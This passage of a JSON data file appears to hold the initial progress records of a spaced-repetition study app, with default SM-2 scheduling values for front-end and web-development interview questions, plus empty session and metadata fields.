      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-bundle-tree-shaking-001",
      "questionId": "bundle-tree-shaking-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-bundle-tree-shaking-002",
      "questionId": "bundle-tree-shaking-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-security-auth-001",
      "questionId": "security-auth-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-security-auth-002",
      "questionId": "security-auth-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-feature-flags-001",
      "questionId": "feature-flags-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-feature-flags-002",
      "questionId": "feature-flags-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-feature-flags-003",
      "questionId": "feature-flags-003",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-css-layout-001",
      "questionId": "css-layout-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-css-layout-002",
      "questionId": "css-layout-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-css-layout-003",
      "questionId": "css-layout-003",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-js-event-loop-001",
      "questionId": "js-event-loop-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-js-event-loop-002",
      "questionId": "js-event-loop-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-accessibility-001",
      "questionId": "accessibility-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-accessibility-002",
      "questionId": "accessibility-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-react-internals-001",
      "questionId": "react-internals-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-react-internals-002",
      "questionId": "react-internals-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-react-internals-003",
      "questionId": "react-internals-003",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-react-internals-004",
      "questionId": "react-internals-004",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    }
  ],
  "sessions": [],
  "metadata": {
    "version": 1,
    "createdAt": "2026-01-03T11:41:15.968Z",
    "updatedAt": "2026-01-03T11:54:12.207Z",
    "totalStudySessions": 0,
    "totalInterviewSessions": 0,
    "studyStreak": 0,
    "lastStudyDate": null
  }
}